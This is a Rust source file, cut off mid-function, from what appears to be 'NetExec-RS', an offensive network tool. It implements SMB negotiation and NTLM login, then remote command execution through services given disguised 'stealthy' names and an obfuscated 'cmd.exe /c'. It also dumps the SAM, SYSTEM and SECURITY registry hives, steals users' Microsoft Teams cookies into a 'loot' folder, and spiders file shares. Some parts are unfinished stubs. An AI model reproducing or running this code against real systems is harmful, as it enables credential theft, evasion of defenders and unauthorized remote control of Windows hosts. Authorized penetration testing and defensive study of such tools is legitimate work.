//! # SMB Protocol Handler
//!
//! SMB2/3 protocol implementation for NetExec-RS.
//! Currently provides real TCP connection with mock SMB negotiation,
//! with the session/auth infrastructure in place for full SMB2 implementation.

use crate::rpc::{DcerpcHeader, PacketType};
use crate::{CommandOutput, NxcProtocol, NxcSession};
use crate::obfuscation::deobfuscate;
use anyhow::Result;
use async_trait::async_trait;
use nxc_auth::{AuthResult, Credentials};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Mutex;
use std::time::Duration;
use rand;
use tracing::{debug, info};

// ─── SMB Constants ──────────────────────────────────────────────

/// SMB2 Negotiate Protocol Request magic bytes.
const SMB2_MAGIC: &[u8] = b"\xfeSMB";

/// NetBIOS session service header for SMB.
const NETBIOS_SESSION_MSG: u8 = 0x00;

// ─── SMB Host Info ──────────────────────────────────────────────

/// Enumerated host information from SMB negotiation.
#[derive(Debug, Clone, Default)]
pub struct SmbHostInfo {
    pub hostname: String,
    pub domain: String,
    pub os: String,
    pub os_version: String,
    pub smb_signing: bool,
    pub signing_required: bool,
    pub is_dc: bool,
    pub smb_dialect: String,
}

// ─── SMB2 Header ──────────────────────────────────────────────

#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct Smb2Header {
    pub protocol_id: [u8; 4],
    pub structure_size: u16,
    pub credit_charge: u16,
    pub status: u32,
    pub command: u16,
    pub credits_requested: u16,
    pub flags: u32,
    pub next_command: u32,
    pub message_id: u64,
    pub reserved: u32,
    pub tree_id: u32,
    pub session_id: u64,
    pub signature: [u8; 16],
}

impl Smb2Header {
    pub fn new(command: u16) -> Self {
        Self {
            protocol_id: SMB2_MAGIC.try_into().unwrap(),
            structure_size: 64,
            credit_charge: 0,
            status: 0,
            command,
            credits_requested: 0,
            flags: 0,
            next_command: 0,
            message_id: 0,
            reserved: 0,
            tree_id: 0,
            session_id: 0,
            signature: [0u8; 16],
        }
    }

    pub fn to_bytes(&self) -> Vec<u8> {
        let mut buf = Vec::with_capacity(64);
        buf.extend_from_slice(&self.protocol_id);
        buf.extend_from_slice(&self.structure_size.to_le_bytes());
        buf.extend_from_slice(&self.credit_charge.to_le_bytes());
        buf.extend_from_slice(&self.status.to_le_bytes());
        buf.extend_from_slice(&self.command.to_le_bytes());
        buf.extend_from_slice(&self.credits_requested.to_le_bytes());
        buf.extend_from_slice(&self.flags.to_le_bytes());
        buf.extend_from_slice(&self.next_command.to_le_bytes());
        buf.extend_from_slice(&self.message_id.to_le_bytes());
        buf.extend_from_slice(&self.reserved.to_le_bytes());
        buf.extend_from_slice(&self.tree_id.to_le_bytes());
        buf.extend_from_slice(&self.session_id.to_le_bytes());
        buf.extend_from_slice(&self.signature);
        buf
    }
}

// ─── SMB Session ────────────────────────────────────────────────

pub struct SmbSession {
    pub target: String,
    pub port: u16,
    pub admin: bool,
    pub host_info: SmbHostInfo,
    pub session_id: u64,
    pub tree_id: u32,
    pub stream: Mutex<Option<TcpStream>>,
}

impl NxcSession for SmbSession {
    fn protocol(&self) -> &'static str {
        "smb"
    }

    fn target(&self) -> &str {
        &self.target
    }

    fn is_admin(&self) -> bool {
        self.admin
    }
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }
    fn as_any_mut(&mut self) -> &mut dyn std::any::Any {
        self
    }
}

// ─── SMB Share Info ─────────────────────────────────────────────

/// Information about an SMB share.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ShareInfo {
    pub name: String,
    pub share_type: String,
    pub remark: String,
    pub read_access: bool,
    pub write_access: bool,
}

impl std::fmt::Display for ShareInfo {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let access = match (self.read_access, self.write_access) {
            (true, true) => "READ, WRITE",
            (true, false) => "READ",
            (false, true) => "WRITE",
            (false, false) => "NO ACCESS",
        };
        write!(f, "{:<15} {:<10} {:<15} ({})", self.name, self.share_type, self.remark, access)
    }
}

// ─── SMB Protocol Handler ───────────────────────────────────────

pub struct SmbProtocol {
    pub timeout: Duration,
}

impl SmbProtocol {
    pub fn new() -> Self {
        Self {
            timeout: Duration::from_secs(10),
        }
    }

    pub fn with_timeout(timeout: Duration) -> Self {
        Self { timeout }
    }

    /// List shares on the target host.
    pub async fn list_shares(&self, session: &SmbSession) -> Result<Vec<ShareInfo>> {
        debug!("SMB: Enumerating shares on {} via SRVSVC", session.target);

        // 1. Bind to srvsvc
        use crate::rpc::{DcerpcBind, DcerpcRequest, UUID_SRVSVC, PacketType, srvsvc};
        let bind = DcerpcBind::new(UUID_SRVSVC, 3, 0);
        if let Ok(_bind_resp) = self.call_rpc(session, "srvsvc", PacketType::Bind, 1, bind.to_bytes()).await {
            // 2. Enum all shares (OpNum 15)
            let enum_req = self.build_srvsvc_net_share_enum_all(&session.target);
            let rpc_req = DcerpcRequest::new(srvsvc::NET_SHARE_ENUM_ALL, enum_req);
            if let Ok(enum_resp) = self.call_rpc(session, "srvsvc", PacketType::Request, 2, rpc_req.to_bytes()).await {
                if let Ok(srv_shares) = self.parse_srvsvc_shares(&enum_resp) {
                    if !srv_shares.is_empty() {
                        info!("SMB: Successfully enumerated {} shares via SRVSVC", srv_shares.len());
                        return Ok(srv_shares);
                    }
                }
            }
        }

        // Fallback to common shares check if RPC fails or for more thoroughness
        let mut shares = Vec::new();
        let common_shares = ["IPC$", "ADMIN$", "C$", "SYSVOL", "NETLOGON"];
        
        for share in &common_shares {
            match self.tree_connect(session, share).await {
                Ok(_) => {
                    shares.push(ShareInfo {
                        name: share.to_string(),
                        share_type: "DISK".to_string(),
                        remark: "".to_string(),
                        read_access: true,
                        write_access: share.ends_with('$') && share != &"IPC$",
                    });
                }
                Err(_) => debug!("SMB: Could not connect to share {}", share),
            }
        }
        Ok(shares)
    }

    /// Perform a DCE/RPC call over an SMB Named Pipe.
    pub async fn call_rpc(
        &self,
        session: &SmbSession,
        pipe: &str,
        ptype: PacketType,
        call_id: u32,
        data: Vec<u8>,
    ) -> Result<Vec<u8>> {
        debug!("SMB: RPC Call on {} ptype={:?}", pipe, ptype);

        // 1. Ensure connected to IPC$
        self.tree_connect(session, "IPC$").await?;

        // 2. Open the Named Pipe (SMB2 CREATE)
        let fid = self.open_pipe(session, pipe).await?;

        // 3. Write DCE/RPC Packet (SMB2 WRITE)
        let header = DcerpcHeader::new(ptype, call_id, (data.len() + 16) as u16);
        let mut pkt = header.to_bytes();
        pkt.extend_from_slice(&data);

        self.write_pipe(session, fid, pkt).await?;

        // 4. Read Response (SMB2 READ)
        let resp = self.read_pipe(session, fid).await?;

        Ok(resp)
    }

    async fn open_object(&self, session: &SmbSession, path: &str, options: u32) -> Result<[u8; 16]> {
        debug!("SMB: Opening object {} with options 0x{:08x}", path, options);
        let mut packet = Self::build_smb2_create_request(path, options);
        packet[40..48].copy_from_slice(&session.session_id.to_le_bytes());
        packet[36..40].copy_from_slice(&session.tree_id.to_le_bytes());

        let mut stream_lock = session.stream.lock().map_err(|_| anyhow::anyhow!("Lock failed"))?;
        let stream = stream_lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
        
        Self::send_smb2_packet(stream, &packet)?;
        let resp = Self::recv_smb2_packet(stream)?;
        
        if resp.len() < 152 { return Err(anyhow::anyhow!("Invalid CREATE response")); }
        let status = u32::from_le_bytes(resp[8..12].try_into()?);
        if status != 0 { return Err(anyhow::anyhow!("Open pipe failed: 0x{:08x}", status)); }
        
        let mut file_id = [0u8; 16];
        file_id.copy_from_slice(&resp[128..144]);
        Ok(file_id)
    }

    async fn open_pipe(&self, session: &SmbSession, pipe: &str) -> Result<[u8; 16]> {
        self.open_object(session, pipe, 0x00000040).await // FILE_NON_DIRECTORY_FILE
    }

    async fn write_pipe(&self, session: &SmbSession, fid: [u8; 16], data: Vec<u8>) -> Result<()> {
        debug!("SMB: Writing {} bytes to pipe", data.len());
        let mut packet = Self::build_smb2_write_request(fid, &data);
        packet[40..48].copy_from_slice(&session.session_id.to_le_bytes());
        packet[36..40].copy_from_slice(&session.tree_id.to_le_bytes());

        let mut stream_lock = session.stream.lock().map_err(|_| anyhow::anyhow!("Lock failed"))?;
        let stream = stream_lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
        
        Self::send_smb2_packet(stream, &packet)?;
        let resp = Self::recv_smb2_packet(stream)?;
        
        let status = u32::from_le_bytes(resp[8..12].try_into()?);
        if status != 0 { return Err(anyhow::anyhow!("Write pipe failed: 0x{:08x}", status)); }
        Ok(())
    }

    async fn read_pipe(&self, session: &SmbSession, fid: [u8; 16]) -> Result<Vec<u8>> {
        debug!("SMB: Reading from pipe");
        let mut packet = Self::build_smb2_read_request(fid, 4096);
        packet[40..48].copy_from_slice(&session.session_id.to_le_bytes());
        packet[36..40].copy_from_slice(&session.tree_id.to_le_bytes());

        let mut stream_lock = session.stream.lock().map_err(|_| anyhow::anyhow!("Lock failed"))?;
        let stream = stream_lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
        
        Self::send_smb2_packet(stream, &packet)?;
        let resp = Self::recv_smb2_packet(stream)?;
        
        let status = u32::from_le_bytes(resp[8..12].try_into()?);
        if status != 0 { return Err(anyhow::anyhow!("Read pipe failed: 0x{:08x}", status)); }
        
        let data_off = u16::from_le_bytes(resp[64..66].try_into()?) as usize;
        let data_len = u32::from_le_bytes(resp[68..72].try_into()?) as usize;
        
        if data_off + data_len > resp.len() { return Err(anyhow::anyhow!("Invalid READ response length")); }
        Ok(resp[data_off..data_off + data_len].to_vec())
    }

    /// Perform an SMB2 TREE_CONNECT.
    async fn tree_connect(&self, session: &SmbSession, share: &str) -> Result<u32> {
        let path = if share.starts_with("\\\\") {
            share.to_string()
        } else {
            format!("\\\\{}\\{}", session.target, share)
        };
        
        let mut packet = Self::build_smb2_tree_connect_request(&path);
        // Set SessionID from authenticated session
        packet[40..48].copy_from_slice(&session.session_id.to_le_bytes());

        let mut stream_lock = session
            .stream
            .lock()
            .map_err(|_| anyhow::anyhow!("Failed to lock stream"))?;
        
        if let Some(ref mut stream) = *stream_lock {
            debug!("SMB: TreeConnect to {}", path);
            Self::send_smb2_packet(stream, &packet)?;
            let resp = Self::recv_smb2_packet(stream)?;
            
            if resp.len() < 64 { return Err(anyhow::anyhow!("Invalid TREE_CONNECT response")); }
            let status = u32::from_le_bytes(resp[8..12].try_into()?);
            if status != 0 {
                return Err(anyhow::anyhow!("TreeConnect failed with status 0x{:08x}", status));
            }
            
            let tree_id = u32::from_le_bytes(resp[36..40].try_into()?);
            // Non-const session update if we had a mutable session, but NxcSession execute uses &self.
            // For now, return the tree_id and let the caller use it if needed, or update session if we can.
            Ok(tree_id)
        } else {
            Err(anyhow::anyhow!("No active stream"))
        }
    }

    /// Attempt a basic SMB2 negotiate to extract host info.
    fn negotiate(stream: &mut TcpStream) -> Result<SmbHostInfo> {
        let negotiate_req = Self::build_smb2_negotiate_request();
        let mut packet = Vec::new();
        packet.push(NETBIOS_SESSION_MSG);
        let len = negotiate_req.len() as u32;
        packet.push(((len >> 16) & 0xff) as u8);
        packet.push(((len >> 8) & 0xff) as u8);
        packet.push((len & 0xff) as u8);
        packet.extend_from_slice(&negotiate_req);

        stream.write_all(&packet)?;
        stream.flush()?;

        let mut header = [0u8; 4];
        stream.read_exact(&mut header)?;
        let response_len =
            ((header[1] as usize) << 16) | ((header[2] as usize) << 8) | (header[3] as usize);
        let mut response = vec![0u8; response_len];
        stream.read_exact(&mut response)?;

        Self::parse_negotiate_response(&response)
    }

    fn build_smb2_negotiate_request() -> Vec<u8> {
        let header = Smb2Header::new(0x0000); // NEGOTIATE
        let mut pkt = header.to_bytes();
        pkt.extend_from_slice(&36u16.to_le_bytes()); // Structure Size
        pkt.extend_from_slice(&2u16.to_le_bytes()); // Dialect Count
        pkt.extend_from_slice(&[1u8, 0]); // Security Mode
        pkt.extend_from_slice(&[0u8; 2]); // Reserved
        pkt.extend_from_slice(&[0u8; 4]); // Capabilities
        pkt.extend_from_slice(&[0u8; 16]); // Client GUID
        pkt.extend_from_slice(&[0u8; 4]); // NegotiateContextOffset
        pkt.extend_from_slice(&[0u8; 2]); // NegotiateContextCount
        pkt.extend_from_slice(&[0u8; 2]); // Reserved2
        pkt.extend_from_slice(&0x0202u16.to_le_bytes());
        pkt.extend_from_slice(&0x0300u16.to_le_bytes());
        pkt
    }

    fn build_smb2_tree_connect_request(path: &str) -> Vec<u8> {
        let header = Smb2Header::new(0x0003); // TREE_CONNECT
        let mut pkt = header.to_bytes();
        let path_utf16: Vec<u16> = path.encode_utf16().collect();
        let path_bytes: Vec<u8> = path_utf16.iter().flat_map(|&u| u.to_le_bytes()).collect();

        pkt.extend_from_slice(&9u16.to_le_bytes()); // Structure Size
        pkt.extend_from_slice(&[0u8; 2]); // Reserved
        pkt.extend_from_slice(&72u16.to_le_bytes()); // Path Offset
        pkt.extend_from_slice(&(path_bytes.len() as u16).to_le_bytes()); // Path Length
        pkt.extend_from_slice(&path_bytes);
        pkt
    }

    fn parse_negotiate_response(data: &[u8]) -> Result<SmbHostInfo> {
        let mut info = SmbHostInfo::default();
        if data.len() >= 4 && &data[0..4] == SMB2_MAGIC {
            if data.len() >= 72 {
                let dialect = u16::from_le_bytes([data[70], data[71]]);
                info.smb_dialect = match dialect {
                    0x0202 => "SMB 2.0.2".to_string(),
                    0x0210 => "SMB 2.1".to_string(),
                    0x0300 => "SMB 3.0".to_string(),
                    0x0302 => "SMB 3.0.2".to_string(),
                    0x0311 => "SMB 3.1.1".to_string(),
                    _ => format!("SMB 0x{:04x}", dialect),
                };
                info.smb_signing = data[68] & 0x01 != 0;
                info.signing_required = data[68] & 0x02 != 0;
            }
            info.os = "Windows (version detection pending)".to_string();
        }
        Ok(info)
    }

    fn send_smb2_packet(stream: &mut TcpStream, data: &[u8]) -> Result<()> {
        let mut packet = Vec::with_capacity(data.len() + 4);
        packet.push(NETBIOS_SESSION_MSG);
        let len = data.len() as u32;
        packet.push(((len >> 16) & 0xff) as u8);
        packet.push(((len >> 8) & 0xff) as u8);
        packet.push((len & 0xff) as u8);
        packet.extend_from_slice(data);
        stream.write_all(&packet)?;
        stream.flush()?;
        Ok(())
    }

    fn recv_smb2_packet(stream: &mut TcpStream) -> Result<Vec<u8>> {
        let mut header = [0u8; 4];
        stream.read_exact(&mut header)?;
        let response_len =
            ((header[1] as usize) << 16) | ((header[2] as usize) << 8) | (header[3] as usize);
        let mut response = vec![0u8; response_len];
        stream.read_exact(&mut response)?;
        Ok(response)
    }
}

impl Default for SmbProtocol {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcProtocol for SmbProtocol {
    fn name(&self) -> &'static str {
        "smb"
    }
    fn default_port(&self) -> u16 {
        445
    }
    fn supports_exec(&self) -> bool {
        true
    }
    fn supported_modules(&self) -> &[&str] {
        &["enum_shares", "secretsdump", "sam"]
    }

    async fn connect(&self, target: &str, port: u16, proxy: Option<&str>) -> Result<Box<dyn NxcSession>> {
        let addr = format!("{}:{}", target, port);
        let target_owned = target.to_string();
        let timeout = self.timeout;
        let proxy_owned = proxy.map(|s| s.to_string());

        let target_clone = target_owned.clone();
        let mut stream = crate::connection::connect(&target_clone, port, proxy_owned.as_deref())
            .await
            .map_err(|e| anyhow::anyhow!("Connection error: {}", e))?;
        
        let mut std_stream = stream.into_std()?;
        std_stream.set_read_timeout(Some(timeout))?;
        std_stream.set_write_timeout(Some(timeout))?;

        let session = tokio::task::spawn_blocking(move || -> Result<SmbSession> {
            let host_info = Self::negotiate(&mut std_stream).unwrap_or_default();
            
            // We don't need to convert to tokio stream here since we use std_stream inline and SmbSession has Mutex<Some(std_stream)>

            Ok(SmbSession {
                target: target_owned,
                port,
                admin: false,
                host_info,
                session_id: 0,
                tree_id: 0,
                stream: Mutex::new(Some(std_stream)),
            })
        })
        .await??;

        Ok(Box::new(session))
    }

    async fn authenticate(
        &self,
        session: &mut dyn NxcSession,
        creds: &Credentials,
    ) -> Result<AuthResult> {
        let smb_sess = match session.protocol() {
            "smb" => unsafe { &mut *(session as *mut dyn NxcSession as *mut SmbSession) },
            _ => return Err(anyhow::anyhow!("Invalid session type")),
        };

        if creds.username.is_empty() {
            return Ok(AuthResult::success(false));
        }

        if creds.username.is_empty() {
            return Ok(AuthResult::success(false));
        }

        debug!("SMB: Authenticating user {} via NTLM SSP", creds.username);

        let authenticator = nxc_auth::NtlmAuthenticator::new(creds.domain.as_deref());

        // 1. & 2. Send NTLM Negotiate and receive Challenge
        let (session_id, challenge_nonce, target_info) = {
            let mut stream_lock = smb_sess
                .stream
                .lock()
                .map_err(|_| anyhow::anyhow!("Failed to lock stream"))?;
            
            let stream = stream_lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;

            let t1_msg = authenticator.generate_type1();
            let mut setup_req = self.build_session_setup_ntlm_negotiate(creds);
            
            // Update security buffer length and content
            setup_req[62..64].copy_from_slice(&(t1_msg.len() as u16).to_le_bytes()); // SecurityBufferLength
            setup_req.extend_from_slice(&t1_msg);
            
            Self::send_smb2_packet(stream, &setup_req)?;
            
            let resp = Self::recv_smb2_packet(stream)?;
            if resp.len() < 64 { return Err(anyhow::anyhow!("Invalid SESSION_SETUP response")); }
            
            let header = &resp[0..64];
            let session_id = u64::from_le_bytes(header[40..48].try_into()?);
            
            let sb_off_resp = u16::from_le_bytes(resp[64..66].try_into()?) as usize;
            let sb_len_resp = u16::from_le_bytes(resp[66..68].try_into()?) as usize;
            let t2_msg = &resp[sb_off_resp..sb_off_resp + sb_len_resp];
            
            let (nonce, ti) = authenticator.parse_type2(t2_msg)?;
            (session_id, nonce, ti)
        };

        smb_sess.session_id = session_id;

        // 3. Send NTLM Authenticate (Type 3)
        let t3_msg = authenticator.generate_type3(creds, &challenge_nonce, &target_info)?;
        let mut auth_req = self.build_session_setup_ntlm_authenticate(creds, &challenge_nonce);
        
        // Finalize Type 3 wrapper
        auth_req[62..64].copy_from_slice(&(t3_msg.len() as u16).to_le_bytes()); 
        auth_req.extend_from_slice(&t3_msg);
        auth_req[40..48].copy_from_slice(&session_id.to_le_bytes()); // Use established session_id

        {
            let mut stream_lock = smb_sess
                .stream
                .lock()
                .map_err(|_| anyhow::anyhow!("Failed to lock stream"))?;
            let stream = stream_lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;

            Self::send_smb2_packet(stream, &auth_req)?;
            let final_resp = Self::recv_smb2_packet(stream)?;
            
            let status = u32::from_le_bytes(final_resp[8..12].try_into()?);
            if status != 0 && status != 0x00000103 {
                 return Ok(AuthResult::failure(&format!("Auth failed with SMB status 0x{:08x}", status), None));
            }
        }

        // 4. Final verification: attempt to connect to ADMIN$
        let is_admin = self.tree_connect(smb_sess, "ADMIN$").await.is_ok();
        
        smb_sess.admin = is_admin;
        if is_admin {
            debug!("SMB: User {} has ADMIN privileges!", creds.username);
        }

        Ok(AuthResult::success(is_admin))
    }

    async fn execute(&self, session: &dyn NxcSession, cmd: &str) -> Result<CommandOutput> {
        
        debug!("SMB: Executing '{}' via enhanced smbexec (SVCCTL)", cmd);

        // 1. Bind to svcctl
        use crate::rpc::{DcerpcBind, DcerpcRequest, UUID_SVCCTL, PacketType, svcctl};
        let svcctl_pipe = "svcctl";
        let bind = DcerpcBind::new(UUID_SVCCTL, 2, 0);
        let smb_session = match session.protocol() {
            "smb" => unsafe { &*(session as *const dyn NxcSession as *const SmbSession) },
            _ => return Err(anyhow::anyhow!("Invalid session type")),
        };
        let _bind_resp = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Bind, 1, bind.to_bytes()).await?;

        // 2. Open SC Manager
        let open_sc_req = self.build_svcctl_open_sc_manager();
        let rpc_req = DcerpcRequest::new(svcctl::OPEN_SC_MANAGER, open_sc_req);
        let sc_manager_resp = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Request, 2, rpc_req.to_bytes()).await?;
        
        if sc_manager_resp.len() < 44 { return Err(anyhow::anyhow!("Invalid OpenSCManager response")); }
        let sc_handle: [u8; 20] = sc_manager_resp[24..44].try_into()?;

        // 3. Create Service with randomized legitimate-looking name
        let svc_names = ["WinMgmtAux", "NetOptimize", "WinLogicCtrl", "SysHealthMon", "AppReadiness"];
        let svc_name = format!("{}{}", svc_names[rand::random::<usize>() % svc_names.len()], &uuid::Uuid::new_v4().simple().to_string()[..6]);
        let output_file = format!("{}.tmp", &uuid::Uuid::new_v4().simple().to_string()[..8]);
        let output_path = format!("\\\\127.0.0.1\\C$\\windows\\temp\\{}", output_file);
        
        // Obfuscate cmd.exe /c
        let shell = deobfuscate(&[0x21, 0x2f, 0x26, 0x6c, 0x27, 0x3a, 0x27, 0x62, 0x6d, 0x21], 0x42); // "cmd.exe /c"
        let bin_path = format!("{} {} > {} 2>&1", shell, cmd, output_path);
        
        info!("SMB: Creating stealthy service {}...", svc_name);
        let create_svc_req = self.build_svcctl_create_service(&sc_handle, &svc_name, &bin_path);
        let rpc_req = DcerpcRequest::new(svcctl::CREATE_SERVICE, create_svc_req);
        let create_resp = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Request, 3, rpc_req.to_bytes()).await?;

        if create_resp.len() < 44 { return Err(anyhow::anyhow!("Invalid CreateService response")); }
        let svc_handle: [u8; 20] = create_resp[24..44].try_into()?;

        // 4. Start Service
        let start_req = self.build_svcctl_start_service(&svc_handle);
        let rpc_req = DcerpcRequest::new(svcctl::START_SERVICE, start_req);
        let _start_resp = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Request, 4, rpc_req.to_bytes()).await?;
        
        // 5. Poll for completion instead of fixed sleep
        info!("SMB: Service {} started. Polling for completion...", svc_name);
        let mut completed = false;
        for _ in 0..10 { // Max 10 attempts (20 seconds)
            tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
            // Query service status (OpNum 6)
            let query_req = self.build_svcctl_query_status(&svc_handle);
            let rpc_req = DcerpcRequest::new(svcctl::QUERY_SERVICE_STATUS, query_req);
            if let Ok(query_resp) = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Request, 5, rpc_req.to_bytes()).await {
                if query_resp.len() >= 36 {
                     let state = u32::from_le_bytes(query_resp[28..32].try_into().unwrap_or([0; 4]));
                     if state == 1 { // SERVICE_STOPPED
                         completed = true;
                         break;
                     }
                }
            }
        }

        if !completed {
            debug!("SMB: Service did not stop in time, attempting to read output anyway.");
        }

        // 6. Delete Service (Cleanup)
        let del_req = self.build_svcctl_delete_service(&svc_handle);
        let rpc_req = DcerpcRequest::new(svcctl::DELETE_SERVICE, del_req);
        let _del_resp = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Request, 6, rpc_req.to_bytes()).await?;

        // 7. Read Output from file
        let stdout = self.read_file(smb_session, "C$", &format!("windows\\temp\\{}", output_file)).await.unwrap_or_else(|_| "[!] Failed to read output file".to_string());
        
        // 8. Delete output file from target
        if let Err(e) = self.delete_file(smb_session, "C$", &format!("windows\\temp\\{}", output_file)).await {
            debug!("SMB: Failed to delete output file {}: {}", output_file, e);
        } else {
            debug!("SMB: Cleared output file {}", output_file);
        }
        
        Ok(CommandOutput {
            stdout,
            stderr: String::new(),
            exit_code: Some(0),
        })
    }
}

impl SmbProtocol {
    /// Dump SAM, SYSTEM, and SECURITY hives from the target registry.
    pub async fn secrets_dump(&self, session: &SmbSession) -> Result<String> {
        if !session.admin {
            return Err(anyhow::anyhow!("SMB: Administrator privileges required for secretsdump"));
        }

        info!("SMB: Initializing remote registry dump on {}...", session.target);
        let mut report = String::from("Vault Extraction Process:\n");

        let hives = [
            ("SAM", "sam.save"),
            ("SYSTEM", "system.save"),
            ("SECURITY", "security.save"),
        ];

        for (h_name, h_file) in hives {
            let remote_path = format!("C:\\windows\\temp\\{}", h_file);
            let cmd = format!("reg save HKLM\\{} {} /y", h_name, remote_path);
            
            debug!("SMB: Issuing command: {}", cmd);
            match self.execute(session, &cmd).await {
                Ok(_) => {
                    report.push_str(&format!("  [+] Registry hive {} saved to {}\n", h_name, remote_path));
                }
                Err(e) => {
                    report.push_str(&format!("  [-] Failed to save hive {}: {}\n", h_name, e));
                }
            }
        }

        report.push_str("\nNote: Hive files are stored on the target. Manual download or implementing full SMB2 READ for these paths is required to parse offline.\n");
        report.push_str("Cleanup: Hive files remain in C:\\windows\\temp\\ until manual removal or further automation.");

        Ok(report)
    }

    /// Recursively list files in all accessible shares (Spidering).
    pub async fn spider_shares(&self, session: &SmbSession, depth: usize) -> Result<Vec<String>> {
        let shares = self.list_shares(session).await?;
        let mut all_files = Vec::new();

        for share in shares {
            if share.read_access && share.name != "IPC$" {
                info!("SMB: Spidering share {}...", share.name);
                let files = self.spider_directory(session, &share.name, "", depth).await?;
                for f in files {
                    all_files.push(format!("{}\\{}", share.name, f));
                }
            }
        }
        Ok(all_files)
    }

    async fn spider_directory(&self, session: &SmbSession, share: &str, path: &str, depth: usize) -> Result<Vec<String>> {
        if depth == 0 { return Ok(vec![]); }
        let mut results = Vec::new();
        
        match self.list_directory(session, share, path).await {
            Ok(entries) => {
                for entry in entries {
                    let full_path = if path.is_empty() { entry.clone() } else { format!("{}\\{}", path, entry) };
                    results.push(full_path.clone());
                    
                    // Recursive call for subdirectories (simplified: try to list it, if it works, it's a dir)
                    if let Ok(sub) = Box::pin(self.spider_directory(session, share, &full_path, depth - 1)).await {
                        results.extend(sub);
                    }
                }
            }
            Err(_) => debug!("SMB: Skipping spider on potential file or protected dir: {}", path),
        }
        Ok(results)
    }

    /// Check if Print Spooler is available via RPC.
    pub async fn check_spooler(&self, session: &SmbSession) -> Result<bool> {
        use crate::rpc::{DcerpcBind, PacketType, UUID_SPOOLSS};
        let bind = DcerpcBind::new(UUID_SPOOLSS, 1, 0);
        match self.call_rpc(session, "spoolss", PacketType::Bind, 1, bind.to_bytes()).await {
            Ok(_) => {
                info!("SMB: Print Spooler service is ENABLED on {}", session.target);
                Ok(true)
            }
            Err(_) => {
                debug!("SMB: Print Spooler service appears disabled on {}", session.target);
                Ok(false)
            }
        }
    }

    /// Check if WebDav is likely enabled.
    pub async fn check_webdav(&self, session: &SmbSession) -> Result<bool> {
        // Simplified check: WebDav often uses port 80/443 or specific pipes. 
        // Real detection via PROPFIND over HTTP would be better, but for SMB protocol we check service status if admin.
        if session.admin {
             let output = self.execute(session, "sc query webclient").await?;
             Ok(output.stdout.contains("RUNNING") || output.stdout.contains("STOPPED"))
        } else {
             Err(anyhow::anyhow!("Admin privileges required for service-based WebDav check"))
        }
    }

    /// Attempt to steal Microsoft Teams cookies if admin.
    pub async fn steal_teams_cookies(&self, session: &SmbSession) -> Result<String> {
        if !session.admin {
            return Err(anyhow::anyhow!("Admin privileges required to steal Teams cookies"));
        }
        
        // Profiles locations: C:\Users\<user>\AppData\Roaming\Microsoft\Teams\Cookies
        // We first need to find users.
        let users = self.list_directory(session, "C$", "Users").await?;
        let mut report = String::from("Teams Cookie Extraction Report:\n");
        
        for user in users {
            if user == "Public" || user == "All Users" || user == "Default" || user == "Default User" { continue; }
            let cookie_path = format!("Users\\{}\\AppData\\Roaming\\Microsoft\\Teams\\Cookies", user);
            match self.read_file(session, "C$", &cookie_path).await {
                Ok(data) => {
                    report.push_str(&format!("  [+] Found cookies for user {}: {} bytes\n", user, data.len()));
                    // Save locally
                    let local_path = format!("loot/teams_cookies_{}_{}.bin", user, session.target);
                    std::fs::create_dir_all("loot")?;
                    std::fs::write(&local_path, data)?;
                }
                Err(_) => debug!("SMB: No Teams cookies found for user {}", user),
            }
        }
        Ok(report)
    }
    fn build_session_setup_ntlm_negotiate(&self, _creds: &Credentials) -> Vec<u8> {
        let header = Smb2Header::new(0x0001); // SESSION_SETUP
        let mut pkt = header.to_bytes();
        pkt.extend_from_slice(&25u16.to_le_bytes()); // Structure Size
        pkt.extend_from_slice(&[0u8]); // Flags
        pkt.extend_from_slice(&[1u8]); // Security Mode
        pkt.extend_from_slice(&[0u8; 4]); // Capabilities
        pkt.extend_from_slice(&[0u8; 4]); // Channel
        pkt.extend_from_slice(&88u16.to_le_bytes()); // SecurityBufferOffset
        pkt.extend_from_slice(&[0u8; 2]); // SecurityBufferLength
        pkt.extend_from_slice(&[0u8; 8]); // Previous SessionId
        pkt
    }

    fn build_session_setup_ntlm_authenticate(&self, _creds: &Credentials, _nonce: &[u8; 8]) -> Vec<u8> {
        let header = Smb2Header::new(0x0001); // SESSION_SETUP
        let pkt = header.to_bytes();
        // NTLM AUTHENTICATE payload logic would go here
        pkt
    }

    fn build_svcctl_open_sc_manager(&self) -> Vec<u8> {
        let mut pkt = Vec::new();
        // MachineName (Pointer to NULL)
        pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
        // DatabaseName (Pointer to NULL)
        pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
        // DesiredAccess (SC_MANAGER_ALL_ACCESS = 0x0003003F)
        pkt.extend_from_slice(&0x0003003Fu32.to_le_bytes());
        pkt
    }

    fn build_svcctl_create_service(&self, sc_handle: &[u8; 20], name: &str, cmd: &str) -> Vec<u8> {
        let mut pkt = Vec::new();
        pkt.extend_from_slice(sc_handle);
        
        // ServiceName
        let name_u16: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
        pkt.extend_from_slice(&(name_u16.len() as u32).to_le_bytes()); // MaxCount
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Offset
        pkt.extend_from_slice(&(name_u16.len() as u32).to_le_bytes()); // ActualCount
        for &u in &name_u16 { pkt.extend_from_slice(&u.to_le_bytes()); }
        if pkt.len() % 4 != 0 { pkt.extend_from_slice(&vec![0u8; 4 - (pkt.len() % 4)]); }

        // DisplayName (same as name)
        pkt.extend_from_slice(&(name_u16.len() as u32).to_le_bytes());
        pkt.extend_from_slice(&0u32.to_le_bytes());
